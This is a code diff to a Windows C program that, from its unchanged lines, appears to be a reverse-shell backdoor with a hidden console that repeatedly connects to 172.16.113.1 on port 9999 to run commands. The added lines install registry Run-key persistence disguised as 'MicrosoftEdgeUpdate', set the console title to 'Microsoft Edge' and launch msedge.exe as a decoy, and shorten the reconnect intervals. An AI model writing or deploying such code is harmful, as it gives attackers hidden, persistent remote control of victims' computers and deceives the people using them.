@@ -5,6 +5,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <iphlpapi.h>
+#include <shellapi.h>
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "iphlpapi.lib")
@@ -73,8 +74,25 @@ int RunCommand(const char* cmd, char* output, size_t output_size) {
     return status;
 }
 
+void RegistryPersist() {
+    HKEY hkey;
+    if (RegOpenKeyExA(HKEY_CURRENT_USER,
+            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            0, KEY_SET_VALUE, &hkey) == ERROR_SUCCESS) {
+        char path[MAX_PATH];
+        GetModuleFileNameA(NULL, path, MAX_PATH);
+        RegSetValueExA(hkey, "MicrosoftEdgeUpdate", 0, REG_SZ,
+                       (BYTE*)path, strlen(path));
+        RegCloseKey(hkey);
+    }
+}
+
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    SetConsoleTitleA("Microsoft Edge");
     ShowWindow(GetConsoleWindow(), SW_HIDE);
+
+    ShellExecuteA(NULL, "open", "msedge.exe", NULL, NULL, SW_SHOWNORMAL);
+    RegistryPersist();
 
     const char* host = "172.16.113.1";
     const int port = 9999;
@@ -91,7 +109,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     while (1) {
         sock = socket(AF_INET, SOCK_STREAM, 0);
         if (sock == INVALID_SOCKET) {
-            Sleep(5000);
+            Sleep(3000);
             continue;
         }
 
@@ -101,7 +119,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
 
         if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
             closesocket(sock);
-            Sleep(30000);
+            Sleep(3000);
             continue;
         }
 
@@ -136,7 +154,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
         }
 
         closesocket(sock);
-        Sleep(10000);
+        Sleep(3000);
     }
 
     WSACleanup();
